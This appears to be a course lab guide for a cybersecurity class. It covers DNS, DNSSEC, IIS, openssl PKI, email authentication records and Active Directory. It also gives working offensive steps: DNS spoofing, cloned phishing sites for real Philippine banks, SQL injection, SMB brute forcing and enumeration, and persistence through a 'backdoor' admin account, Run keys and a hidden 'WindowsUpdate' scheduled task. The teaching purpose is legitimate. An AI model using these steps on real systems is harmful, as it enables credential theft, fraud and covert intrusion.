
<!-- Your monitor number = #$34T# -->


## ⛅ Warm Up for Day 2.

Access the ff via SecureCRT:
- 10.#$34T#.1.2       CoreTAAS
- 10.#$34T#.1.4       CoreBABA
- 10.#$34T#.100.8     CUCM
- 10.#$34T#.#$34T#.1  EDGE

<br>

Verify Connectivity:

~~~cmd
@cmd
ping 10.#$34T#.1.10         PC Network Adapter
ping 10.#$34T#.1.2		    CoreTAAS
ping 10.#$34T#.1.4		    CoreBABA
ping 10.#$34T#.100.8		CUCM
ping 10.#$34T#.#$34T#.1		EDGE - INSIDE
ping 200.0.0.#$34T#		    EDGE - OUTSIDE

ping 200.0.0.k		        Klassmate's EDGE	       k = klassmate's Monitor Number
ping 10.k.100.8		        Klassmate's CUCM
ping 10.k.1.4		        Klassmate's CoreBABA
ping 10.k.1.2		        Klassmate's CoreTAAS
ping 10.k.1.10		        Klassmate's PC
~~~


<br>
<br>

---
&nbsp;


## Infrastructure Services

### Deploy 

Devices:
- Windows Server 2022

Windows Server 2022:
  Name: SEC-AZURE-#$34T#
  
  | NetAdapter        | Connection          | IP Address        |
  | ---               | ---                 | ---               |
  | Network Adapter 1 | NAT                 | 208.8.8.8     /24 |
  | Network Adapter 2 | VMNet 2             | 192.168.102.8 /24 |
  | Network Adapter 3 | VMNet 3             | 192.168.103.8 /24 |
  | Network Adapter 4 | VMNet 3             |                   |
  | Network Adapter 5 | VMNet 3             |                   |
  | Network Adapter 6 | Bridged (Replicate) | 10.#$34T#.1.8 /24 |


<br>
<br>

---
&nbsp;


## NIC Teaming
*Availability - Load Balancing and Failover*

<br>

|           | Value              |
| ---       | ---                |
| Team Name | NIC-T3             |
| Adapters  | T3-1, T3-2, T3-3   |
| TMode     | Switch Independent |
| LMode     | Address Hash       |
| Standby   | T3-3               |


<br>
<br>

---
&nbsp;


### Server Roles and Features
1. DNS
2. Web IIS
3. FTP
4. Net Framework


&nbsp;
---
&nbsp;


## Domain Name System
~~~
!@cmd
ping www.sec#$34T#.com

ping smtp.sec#$34T#.com
~~~


&nbsp;
---
&nbsp;


### DNS Hierarchy
1. ROOT
2. TLD
3. SLD
4. RECORDS


<br>
<br>

---
&nbsp;


## Securing DNS
1. DNS Encryption  
2. DNS Integrity and Authentication (Non-Repudiation)  


&nbsp;
---
&nbsp;


### No Encryption
~~~
Client PC
   |
   | UDP 53
   |
   | Query:
   | "www.sec69.com?"
   |
   ▼
DNS Server
~~~


&nbsp;
---
&nbsp;


### DNS over TLS (DoT)
~~~
Client PC
     |
     | TCP 853
     |
     | TLS encrypted tunnel
     |
     ▼
DNS Resolver
~~~


<br>


1. TLS Handshake
2. Key Exchange
3. Encrypted DNS Query


&nbsp;
---
&nbsp;


### DNS over HTTPS (DoH)
~~~
Client PC
    |
    | TCP 443
    | HTTPS + TLS
    |
    ▼
DoH Server
~~~


<br>


Client > DNSServer.com:443


&nbsp;
---
&nbsp;


### DNS over QUIC (DoQ)
~~~
Client PC
        |
        | UDP 853
        |
        | QUIC + TLS 1.3
        |
        ▼
DoQ Resolver
~~~


<br>
<br>

---
&nbsp;


🔴 __DNS Spoofing:__
- WireShark
- Pentest

<br>

STEP 1: MODIFY

__etter.dns__
~~~
www.rivanit.com    A        192.168.102.50
~~~


<br>


STEP 2:  SPOOF
*NOTE: Make Sure DNS is 8.8.8.8  


<br>
<br>

---
&nbsp;


## Implementing DNSSEC 

### 1. Enforce DNSSEC on Client

Win+R: `gpedit`

<br>

Local Computer Policy >   
 Computer Configuration >   
         Windows Settings >  

__Name Resoluction Policy__  
Suffix: sec#$34T#.com  
DNSSEC:  
  - Enabled
  - Require


<br>


~~~
!@powershell
gpupdate /force
clear-dnsservercache
ipconfig /flushdns
~~~


&nbsp;
---
&nbsp;


### 2. Sign `sec#$34T#.com`  
  - DNSKEY  
  - Resource Record Signature  
  - NSEC3  


&nbsp;
---
&nbsp;


### 3. Export DNS KEY  
- View Certificates `certlm.msc`  


&nbsp;
---
&nbsp;


### 4. Import DNSSEC KEYS on the DNS Client
Win+R: `\\208.8.8.8\c$`


<br>


`DNS Server` > `Trust Points`
- Import DNS Key


&nbsp;
---
&nbsp;


### 5. Refresh DNS Server Cache
~~~
!@cmd
clear-dnsservercache
ipconfig /flushdns
~~~


<br>
<br>

---
&nbsp;


## Web Server
__Configure Web Server (sec#$34T#.com)__  
1. Internet Information Services Manager
2. Create an `http` mapping for the domain `www.sec#$34T#.com`


<br>

__Access__
http://www.sec#$34T#.com/


<br>
<br>

---
&nbsp;


### 🔴 Phishing Websites
Configure DNS for  `bclo.com`

| Record | Mapping   |
| ---    | ---       |
|        | 208.8.8.8 |
| ns     | 208.8.8.8 |
| www    | 208.8.8.8 |


<br>
<br>


1. Internet Information Services Manager
2. Create an `http` mapping for the bdo web files to the domain `www.bclo.com`

<br>

__Access__
http://www.bclo.com/


<br>
<br>

---
&nbsp;


### 🎯 Exercise: Create another phishing website for bpi.com.ph

<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>


<br>
<br>

---
&nbsp;


## Secure Web (HTTPS)

### CA Hierarchy
1. ROOT CA   (Self-signed)
2. SUB CA
3. LEAF CA


<br>
<br>

~~~
!@cmd
ping -4 www.rivanit.com
~~~


<br>
<br>

---
&nbsp; 


### SSL Certificate

Subject : Distinguished Names  
  - Defined ITU-T (International Telecommunication Union Telecommunication Standardization Sector) X.500 Series
  - X.501 - Defines the directory model and Distinguished Names.
  - X.520 - Defines the standard attribute types used in DNs


<br>
<br>

---
&nbsp; 


## PKI Certificate Services

### 1. PKCS#1 – RSA Cryptography Standard
- Defines the format for RSA public and private keys and the algorithms for RSA encryption and signature.
- Generating RSA keys.


&nbsp;
---
&nbsp;


### 2. PKCS#3 – Diffie-Hellman Key Agreement Standard
- Specifies how to perform the Diffie-Hellman key exchange for secure symmetric keys.
- Establishing shared secret keys in a secure channel.


&nbsp;
---
&nbsp;


### 3. PKCS#5 – Password-Based Encryption (PBE)
- Defines how to derive cryptographic keys from passwords and encrypt data using them.
- Protecting private keys with a password.
- password protection / encryption


&nbsp;
---
&nbsp;


### 4. PKCS#7 – Cryptographic Message Syntax Standard
- Standard for signing and encrypting messages and certificates.
- Import/export certificate chains in Windows/Java.
- certificates (no key), often for chains


&nbsp;
---
&nbsp;


### 5. PKCS#8 – Private-Key Information Syntax
- Standard format for storing private keys, can include encryption.
- PKCS#1 is only RSA keys; PKCS#8 supports multiple algorithms (RSA, DSA, EC).
- private keys


&nbsp;
---
&nbsp;


### 6. PKCS#10 – Certificate Signing Request (CSR)
- Standard for requesting a certificate from a Certificate Authority (CA).
- Public key, identity information (Common Name, Org), optional attributes.
- certificate requests


&nbsp;
---
&nbsp;


### 7. PKCS#12 – Personal Information Exchange
- Securely store and transport private keys + certificates.
- Always password-protected.
- Import/export keys and certificates across platforms (Windows, IIS, Java keystores).
- secure bundle of key + certificate



<br>
<br>

---
&nbsp;


### Wildcard Certificate  
Configure DNS for  `sec#$34T#.com`

| Record | Mapping           |
| ---    | ---               |
| www    | 208.8.8.8         |
| web    | www.sec#$34T#.com |
| site   | www.sec#$34T#.com |


&nbsp;
---
&nbsp;


### 🎯 Exercise: Create a ROOT, INTERMEDIATE, LEAF Certificate for https://www.bclo.com

<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>


&nbsp;
---
&nbsp;


### OPENSSL Command Line
__1. Setup VM__
Network Adapter: NAT
~~~
!@yvm
sudo su
passwd tc
> pass
> pass

tce-load -wi nano

ifconfig
~~~


<br>


__2. Setup Workspace__
~~~
!@yvm
mkdir certs;cd certs; \
  mkdir -p ca csr grant key
~~~


<br>


__3. Create a Private Key__
~~~
!@yvm
openssl genrsa \
  -out key/ca-key.pem \
  2048
~~~


<br>


__4. Assign File Permissions__
~~~
!@yvm
ls -l key/ca-key.pem
chmod 600 key/ca-key.pem
~~~


<br>


__5. Verify RSA Key__
~~~
!@yvm
openssl rsa \
  -in key/ca-key.pem \
  -text \
  -noout
~~~


<br>


__6. Export Public Key from Private Key__
~~~
!@yvm
openssl rsa \
  -in key/ca-key.pem \
  -pubout \
  -out key/ca-key-pub.pem
~~~


<br>


__7. Generate a Self-Signed CA Certificate__
~~~
!@yvm
openssl req \
 -x509 \
 -new \
 -nodes \
 -key key/ca-key.pem \
 -sha256 \
 -days 3650 \
 -out ca/ca.crt

-----
Country Name (2 letter code) [AU]:                         
State or Province Name (full name) [Some-State]:           
Locality Name (eg, city) []:                               
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:                 
Common Name (e.g. server FQDN or YOUR name) []:            
Email Address []:                                          
~~~


<br>


__8. Verify CA Certificate__
~~~
!@yvm
openssl x509 \
  -in ca/ca.crt \
  -text \
  -noout
~~~


<br>


__9. Generate a private key for an Endpoint and extract the public key__
~~~
!@yvm
openssl genrsa \
  -out key/end-key.pem \
  2048
~~~

~~~
!@yvm
chmod 600 key/end-key.pem
~~~

~~~
!@yvm
openssl rsa \
  -in key/end-key.pem \
  -pubout \
  -out key/end-key-pub.pem
~~~


<br>


__10. Generate a Certificate Signing Request for Endpoints__
~~~
!@yvm
openssl req \
  -new \
  -key key/end-key.pem \
  -out csr/end.csr
~~~


<br>


__11. Verify CSR__
~~~
!@yvm
openssl req \
  -in csr/end.csr
  -noout
  -text
~~~


<br>


__12. Sign the CSR using the CA__
~~~
!@yvm
nano end.cnf
~~~

__end.cnf__
~~~
[ req ]
default_bits       = 2048
default_md         = sha256
distinguished_name = dn
req_extensions     = v3_leaf_req
prompt             = no

[ dn ]
C  = PH
ST = NCR
L  = Makati
O  = CCENTURE
OU = HQ
CN = ACCENTURE WEBSITE

[ v3_leaf_req ]
basicConstraints    = critical, CA:false
keyUsage            = critical, digitalSignature, keyEncipherment
extendedKeyUsage    = serverAuth, clientAuth, ipsecEndSystem, ipsecTunnel, ipsecUser, ipsecIKE
subjectAltName      = @alt_names

[ alt_names ]
DNS.1   = www.accenture.com
IP.1    = 208.8.8.8
~~~

~~~
!@yvm
openssl x509 \
  -req \
  -in csr/end.csr \
  -CA ca/ca.crt \
  -CAkey key/ca-key.pem \
  -CAcreateserial \
  -out grant/end.crt \
  -days 365 \
  -extfile end.cnf \
  -extensions v3_leaf_req
~~~


&nbsp;
---
&nbsp;


### Configuration Files (ROOT CA, INTERMEDIATE CA, LEAF CA)
~~~
[ req ]
default_bits       = 
default_md         = 
prompt             = 
distinguished_name = 
x509_extensions    = 


[ dn ]
C  = 
ST =
L  =
O  =
OU =
CN =


[ v3_ca ]
subjectKeyIdentifier   = 
authorityKeyIdentifier = 
basicConstraints       = 
keyUsage               = 
~~~


<br>
<br>

---
&nbsp;


## Enterprise Email Server
- HMail Server
- Thunderbird

<br>

Setup __DNS Secondary Zones__ & __Conditional Forwarders__
~~~
!@cmd SEC-AZURE#$34T#
route add 10.0.0.0 mask 255.0.0.0 10.#$34T#.1.4 -p
route add 200.0.0.0 mask 255.255.255.0 10.#$34T#.1.4 -p
~~~


<br>
<br>

---
&nbsp;


## Security Awareness
Phishing Simulation  

__Admin__ > __Users__  

<br>

~~~
Example:
Subject: Action Required: Password Expires Today
Text: Click here to update your password.
~~~


&nbsp;
---
&nbsp;



### 🔴 Email Compromise
~~~
!@cmd
nmap -v 208.8.8.8
~~~

<br>

__ENUMERATION__
~~~
!@cmd
telnet 208.8.8.8 143
a1 CAPABILITY
. logout
~~~


~~~
!@cmd
nmap -p 143 --script imap-capabilities 208.8.8.8
nmap -p 143 --script imap-ntlm-info 208.8.8.8
nmap -p 143,993 --script imap-* 208.8.8.8
~~~


<br>
<br>

---
&nbsp;


## EMAIL SECURITY
Three Essential DNS Records for EMAIL Security:
1. SPF 
2. DKIM 
3. DMARC 

<br>

S/MIME 
 - Encrypts
 - Digitally signs emails


&nbsp;
---
&nbsp;



__DKIM Record__
~~~TXT RECORD
RECORD NAME: mailname._domainkey
TEXT:
v=DKIM1; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAv...
~~~

<br>

| Attribute   | Value                       |
| ---         | ---                         |
| mailname    | user defined local name     |
| ._domainkey | Fixed Value (DO NOT CHANGE) |
| v           | DKIM Version                |
| k           | Key Algorithm (rsa default) |
| p           | Public Key                  |


&nbsp;
---
&nbsp;


__DMARC Record__
~~~TXT RECORD
RECORD NAME: _dmarc
TEXT:
v=DMARC1; p=none; rua=mailto:dmarc@contoso.com
~~~

<br>

| Attribute   | Value                       |
| ---         | ---                         |
| mailname    | user defined local name     |
| ._domainkey | Fixed Value (DO NOT CHANGE) |
| v           | DKIM Version                |
| k           | Key Algorithm (rsa default) |
| p           | Public Key                  |


<br>
<br>

---
&nbsp;


## Identity Access Management
Install `Active Directory Domain Services`

<br>

Identity Management Framework (AGDLP)
__Accounts__ > __Global Group__ > __Domain Local__ > __Permissions__

| OU  | Local Domain | Global Group | Users |
| --- | ---          | ---          | ---   |
| NOC | LGNOC        | GGNOC        | ac    |
| SOC | LGSOC        | GGSOC        | kc    |
| FIN | LGFIN        | GGFIN        | zc    |

<br>

~~~
On GPO > Default Domain Policy
         > Computer Config 
		   > Policies 
		     > Window Settings 
		       > Security Settings 
			     > Local Policies 
				   > User Rights
				     > Allow Log On Locally
					   > Add : Administrators, and LGGRoups
~~~

~~~
!@cmd
gpupdate /force
~~~


<br>
<br>

---
&nbsp;


## 🔴 Web Security : Input Validation
*SQL-Injection/Web-Based Attacks*

Adapter: VMNET-1
__Pentest - Activate SSH__
~~~
!@_Pentest
nmcli connection add \
  type ethernet \
  con-name NAT \
  ifname eth0 \
  ipv4.method manual \
  ipv4.addresses 208.8.8.120/24 \
  ipv4.gateway 208.8.8.2 \
  autocon true

systemctl start ssh
systemctl status ssh
~~~


__Activate OWASP__
~~~
!@_Pentest
/opt/lampp/xampp start
/opt/lampp/xampp status
~~~

Access OWASP:  http://127.0.0.1/mutillidae/src/index.php


<br>
<br>

If a website runs this code:
~~~
SELECT * FROM users WHERE username = 'input' AND password = 'input';
~~~

An attacker could input:
~~~
' OR '1'='1
' OR '1'='1
~~~


<br>
<br>

---
&nbsp;


## 🔴 Attack Surface
*Anything can be vulnerable*

- Software
- Apps
- Access Control
- Network
- Cryptography
- OS
- Hardware
- Physical
- Input
- Human


<br>
<br>


On WinServer
- Add HardDisk: 5gb

<br>

`Server Manager` > `File and Storage Services` > `New Storage Pool`
  > Close Open Server Manager > `New Virtual Disk`
  > Thin

<br>

Make Windows Server Vulnerable
~~~powershell
!@Powershell
Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
Add-WindowsCapability -Online -Name Openssh.Server
~~~


<br>
<br>

---
&nbsp;


## MITRE ATT&CK

<br>

__Phases of Ethical Hacking__
### 1. Reconnaissance - Gather info about the target (Non-Intrusive)

`cia.gov` vs `neu.edu.ph` vs `sti.edu.ph` vs `dpwh.gov.ph`


Which ones have a CDN (Content Delivery Network)
~~~
!@cmd
nslookup -type=NS neu.edu.ph
~~~

<br>

Scan Subnet
~~~
!@cmd
nmap -sP 192.168.102.0/24
~~~

<br>

__Recon__
~~~
!@_Pentest
ping 192.168.102.8
nmap -O 192.168.102.8

nmap -p 445 --script smb2-capabilities 192.168.102.8
nmap -sU -sS -p 445 --script smb-protocols 192.168.102.8
nmap -p 445 --script smb2-security-mode 192.168.102.8
nmap --script smb-os-discovery -p 445 192.168.102.8

curl.exe ipinfo.io/rivanit.com
~~~


&nbsp;
---
&nbsp;


### 2. Scanning/Enumeration - Extract detailed info about the target (Both Intrusive/Non-Intrusive)

~~~
!@_Pentest
enum4linux -a  -u administrator -p C1sc0123 192.168.102.8
nmap -v 192.168.102.8
nmap --script=smb-enum-shares,smb-enum-groups,smb-enum-domains --script-args smbuser=administrator,smbpass=C1sc0123  -p 445 192.168.102.8
~~~


&nbsp;
---
&nbsp;


### 3. Exploitation - Exploit Vulnerabilities (Threat Vectors)

*RockYou* - Compilation of Usernames and Password of Past Breaches
*SecLists* - https://github.com/danielmiessler/SecLists

__NetSMB__
~~~ 
!@cmd
net use \\10.3.3.x\ipc$ /user:administrator C1sc0123
net use x: /delete
net use x: \\10.3.3.x\c$
~~~

<br>

Brute Force User & Pass *Dictionary Attack*
~~~
!@_Pentest
hydra -L users.txt -P password.txt smb2://192.168.102.8
~~~


&nbsp;
---
&nbsp;


### 4. Execution (Exfiltration of Data)
~~~
!@_Pentest
smbclient //192.168.102.8/e$ -U administrator%C1sc0123
~~~


&nbsp;
---
&nbsp;


### 5. Maintain Persistent Access
*lusrmgr.msc*


<br>
<br>

---
&nbsp;


### Local User
~~~
!@_Pentest
evil-winrm -i 192.168.102.8 -u administrator -p C1sc0123
net user backdoor C1sc0123 /add
net localgroup administrators backdoor /add
~~~

<br>

__Create Registry Entry__
~~~
!@_Pentest (winrm Session)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File \"C:\Windows\Temp\backdoor.ps1\"" /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
schtasks /create /tn "WindowsUpdate" /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Windows\Temp\backdoor.ps1" /sc onlogon /ru SYSTEM /f
~~~

<br>

__Other regedit schtasks commands__
~~~
Get-ScheduledTask
schtasks /delete /tn "WindowsUpdate" /f
~~~

<br>

__backdoor.ps1__
~~~powershell
$username = "backdoor"
$password = ConvertTo-SecureString "C1sc0123" -AsPlainText -Force

New-LocalUser $username -Password $password
Add-LocalGroupMember -Group "Administrators" -Member $username
~~~


&nbsp;
---
&nbsp;


### HIDE POWERSHELL EXECUTION (VBS Scripting)
__File.vbs__
~~~
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""C:\Windows\Temp\backdoor.ps1""", 0, False
~~~

__REGISTRY & TASKS SCHED__
~~~
!@PowerShell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoors /t REG_SZ /d "wscript.exe C:\Windows\Temp\MSServerRegistry.vbs" /f
schtasks /create /tn "WindowsUpdate" /tr "wscript.exe C:\Windows\Temp\MSServerRegistry.vbs" /sc onlogon /ru SYSTEM
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
~~~
